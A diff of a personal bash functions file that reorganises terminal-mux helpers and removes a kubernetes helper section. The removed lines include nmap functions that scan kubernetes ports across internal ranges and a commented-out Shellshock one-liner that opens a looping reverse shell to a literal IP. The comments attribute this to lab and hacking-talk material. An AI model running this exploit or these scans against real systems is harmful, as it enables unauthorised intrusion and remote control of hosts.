@@ -3,19 +3,41 @@
 # -----------------------------------------------------------------------------
 # opening helpers
 
-vf() { $(which vlc) "$(fzf)" > /dev/null 2>&1 ;}
+vf() { vlc "$(fzf)" > /dev/null 2>&1 ;}
 hf() { hx "$(fzf)" ;}
 h() { hx . ;}
+
+# -----------------------------------------------------------------------------
+# zellij/guake + terminal mux helpers
+
 # shellcheck disable=SC2068
 rc() { zellij run -- $@ ;}
 # shellcheck disable=SC2068
-ra() { zellij run -- "$(which bash)" -ic $@ ;}
+ra() { zellij run -- bash -ic $@ ;}
 
 # zellij tab from layout
 zl() {
   local -r name="${PWD##*/}"
   local -r layout="$(cd ~/.config/zellij/layouts && fd . | fzf)"
   zellij action new-tab --layout "$HOME/.config/zellij/layouts/${layout}" --name="${name}"
+}
+
+# terminal mux helpers to rename the tab we do something
+zz() {
+  if [[ ! "${OSTYPE}" =~ "darwin" ]]; then
+    guake --rename-tab="${PWD##*/}" -i "$(guake -g)"
+  else
+    zellij action rename-tab "${PWD##*/}"
+  fi
+}
+zzh() {
+  if [[ ! "${OSTYPE}" =~ "darwin" ]]; then
+    guake --rename-tab="$1" -i "$(guake -g)"
+  else
+    zellij action rename-tab "$1"
+  fi
+  # shellcheck disable=SC2068
+  ssh $@
 }
 
 # -----------------------------------------------------------------------------
@@ -101,144 +123,9 @@ sysreload() {
 }
 complete -F _syslistunits sysreload
 
-# -----------------------------------------------------------------------------
-# kubernetes
-
-# context switcher
-kc() {
-  # Relies on KUBECONFIG set to colon delimeted list of all kubeconfigs:
-  #export KUBECONFIG="$(fd . ~/.kube --max-depth 1 --type f | tr '\n' ':')"
-  kubectl config use-context "$(kubectl config get-contexts -o name | grep -v fqdn | fzf)"
-}
-
-# namespace switcher
-kns() {
-  local -r ns="$(kg ns | choose 0 | tail -n +2 | fzf)"
-  local -r ctx="$(kubectl config current-context)"
-  kubectl config set "contexts.$ctx.namespace" "$ns"
-}
-
-# streamlined yaml viewer (tons of aliases for it in .aliases)
-ky() {
-  local -r resource="${1:-$(kubectl api-resources --no-headers | choose 0 | fzf)}"
-  local -r name="${2:-$(kubectl get "${resource}" --no-headers | choose 0 | fzf)}"
-  kubectl get "${resource}" "${name}" -oyaml | bat -l=yaml --plain --theme=DarkNeon
-}
-
-# same thing for describe
-kd() {
-  local -r resource="${1:-$(kubectl api-resources --no-headers | choose 0 | fzf)}"
-  local -r name="${2:-$(kubectl get "${resource}" --no-headers | choose 0 | fzf)}"
-  kubectl describe "${resource}" "${name}"
-}
-# log helper that lets you complete container name (if more than one)
-kl() {
-  resource="${1:-pod}"
-  local -r name="${2:-$(kubectl get "${resource}" --no-headers | choose 0 | fzf)}"
-  if [[ "$resource" = "pod" ]]; then
-    jqpth=".spec.containers"
-  elif [[ "$resource" =~ service|svc ]]; then
-    if kubectl get deploy "${name}" > /dev/null 2>&1; then
-      resource="deploy"
-    elif kubectl get sts "${name}" > /dev/null 2>&1; then
-      resource="sts"
-    elif kubectl get ds "${name}" > /dev/null 2>&1; then
-      resource="ds"
-    fi
-    jqpth=".spec.template.spec.containers" # workload path
-  else
-    jqpth=".spec.template.spec.containers" # workload path
-  fi
-  local -r data="$(kubectl get "${resource}/${name}" -ojson)"
-  if [[ "$(echo "${data}" | jq "${jqpth} | length")" = 1 ]]; then
-    container="$(echo "${data}" | jq "${jqpth}[].name" -r)" # use first container
-  else
-    container="$(echo "${data}" | jq "${jqpth}[].name" -r | fzf)" # user choice
-  fi
-  kubectl logs -f "${resource}/${name}" "${container}"
-}
-
-# cluster version checker
-kcver() {
-  for ctx in $(kubectl config get-contexts -o name | grep -v fqdn); do
-    kubectl config use-context "${ctx}" > /dev/null
-    echo "${ctx}$(kubectl version --short | grep Server | grep -oE " v.*")"
-  done
-}
-
-k3dmake() {
-  local -r name="$1"
-  shift
-  # shellcheck disable=SC2068
-  k3d cluster create "${name}" --servers 1 --registry-create "${name}" $@ \
-    --no-lb --no-rollback \
-    --k3s-arg "--disable=traefik,servicelb,metrics-server@server:*" \
-    --k3s-arg '--kubelet-arg=eviction-hard=imagefs.available<1%,nodefs.available<1%@agent:*' \
-    --k3s-arg '--kubelet-arg=eviction-minimum-reclaim=imagefs.available=1%,nodefs.available=1%@agent:*'
-  k3d kubeconfig get --all > ~/.kube/k3d
-  # rustls workaround
-  sd "0.0.0.0" "localhost" ~/.kube/k3d
-}
-
-if [[ ! "${OSTYPE}" =~ "darwin" ]]; then
-  # main machines are amd64, rely on arch bin on mac
-  arch() {
-    echo "amd64"
-  }
-fi
-
-k3dmake23() {
-  # could implement versions via
-  # https://github.com/nolar/setup-k3d-k3s/blob/v1/action.sh
-  # but ideally rancher/k3s should have better tags
-  # pick one from https://hub.docker.com/r/rancher/k3s
-  k3dmake "$1" "--image=rancher/k3s:v1.23.14-k3s1-$(arch)"
-}
-
-k3dmake24() {
-  k3dmake "$1" "--image=rancher/k3s:v1.24.8-k3s1-$(arch)"
-}
-k3dmake25() {
-  k3dmake "$1" "--image=rancher/k3s:v1.25.4-k3s1-$(arch)"
-}
-
-
-# misc kube helpers
-khevict() {
-  # NB: status.reason=Evicted is not an allowed field selector..
-  # => have to either pipe through a filter, or use Failed as an approximation:
-  #kubectl delete pod --field-selector 'status.phase=Failed'
-  kubectl get pods | awk '/Evicted/ {print $1}' | xargs kubectl delete pod
-}
-khleftovers() {
-  kubectl api-resources --verbs=list --namespaced -o name \
-  | xargs -n 1 kubectl get --show-kind --ignore-not-found
-}
-
-nmap-kube () {
-    nmap --open -T4 -A -v -Pn -p 443,2379,4194,6782-6784,6443,8443,8080,9099,10250,10255,10256 "${@}"
-}
-
-nmap-kube-discover () {
-    local -r LOCAL_RANGE="$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,')"
-    local SERVER_RANGES=" ";
-    SERVER_RANGES+="10.0.0.1 ";
-    SERVER_RANGES+="10.0.1.* ";
-    SERVER_RANGES+="10.*.0-1.* ";
-    nmap-kube "${SERVER_RANGES}" "${LOCAL_RANGE}"
-}
-
-# stuff via bulletproof kubernetes hacking
-# https://www.youtube.com/watch?v=NEfwUxId1Uk
-# https://github.com/kubernetes-simulator/simulator
-#while :; do ssh controlplane ncat --listen 1234 --output $(mktemp /tmp/hack-XXXX.log); done
-
-# shellshock as a service https://github.com/hmlio/vaas-cve-2014-6271
-# continuous dev/tcp hackery via shellshock:
-#while :; do curl http://165.22.113.204:30081/cgi-bin/stats  -H 'user-agent: () { :; }; echo; echo; 2>&1 /bin/bash -c "while :; do nohup bash -i >& /dev/tcp/149.202.164.115/1234 0>&1; sleep 1; done"'; done
 
 # -----------------------------------------------------------------------------
-# git
+# git for loops
 
 glscommand() {
   local -r dirs=$(find . -maxdepth 1 -mindepth 1 -type "d")
@@ -274,25 +161,6 @@ diffd() {
 t() {
   tree -aC -I "node_modules|target|site-packages|.git|bower_components|venv" --dirsfirst "$@" | less -FRX
 }
-
-# terminal mux helpers to rename the tab we do something
-zz() {
-  if [[ ! "${OSTYPE}" =~ "darwin" ]]; then
-    guake --rename-tab="${PWD##*/}" -i "$(guake -g)"
-  else
-    zellij action rename-tab "${PWD##*/}"
-  fi
-}
-zzh() {
-  if [[ ! "${OSTYPE}" =~ "darwin" ]]; then
-    guake --rename-tab="$1" -i "$(guake -g)"
-  else
-    zellij action rename-tab "$1"
-  fi
-  # shellcheck disable=SC2068
-  ssh $@
-}
-
 
 # Create a new directory and enter it
 mkd() { mkdir -p "$@" && cd "$@" || return 1 ;}
@@ -340,12 +208,6 @@ transfer() {
 ruby-env() {
   local -r gemdir="$(ruby -e 'print Gem.user_dir')"
   export PATH="${gemdir}/bin:$PATH"
-}
-
-banish-daemons() {
-  sudo systemctl stop docker
-  sudo systemctl stop postgresql
-  pm2 kill
 }
 
 steam-tf2() {
